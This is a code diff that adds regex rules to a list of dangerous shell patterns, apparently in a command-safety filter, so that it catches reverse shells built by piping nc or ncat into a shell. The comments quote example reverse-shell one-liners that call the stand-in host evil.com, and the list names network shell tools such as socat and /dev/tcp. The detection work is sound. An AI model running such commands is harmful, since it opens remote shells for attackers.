@@ -429,6 +429,13 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   // no shell exec) do not match because neither has -e followed by a shell name.
   { pattern: /\bnc\b.*-e\b.*\b(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash)\b/, category: "reverse-shell" },
   { pattern: /\bncat\b.*-e\b.*\b(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash)\b/, category: "reverse-shell" },
+  // Reverse shell via nc/ncat pipe-to-shell — flag-free variant that bypasses the -e guard above.
+  // e.g. `nc evil.com 4444 | bash | nc evil.com 4445` or `ncat evil.com 4444 | sh`
+  // Symmetric with the already-guarded `curl | bash` and `wget | bash` patterns.
+  // False-positive analysis: `nc -l 8080 | tee log` and `nc -z host port` do not match because
+  // `tee` is not in the shell alternation list.
+  { pattern: /\bnc\b.*\|\s*(?:[\w./]*\/)?(?:(?:ba|z|da|k|a)?sh|fish|t?csh)\b/, category: "reverse-shell" },
+  { pattern: /\bncat\b.*\|\s*(?:[\w./]*\/)?(?:(?:ba|z|da|k|a)?sh|fish|t?csh)\b/, category: "reverse-shell" },
   { pattern: /\/dev\/tcp\//, category: "reverse-shell" },
   { pattern: /\bsocat\b.*\bEXEC:/, category: "reverse-shell" },
   // Reverse shell via mkfifo — `mkfifo /tmp/f; nc evil.com 4444 < /tmp/f | bash > /tmp/f 2>&1`
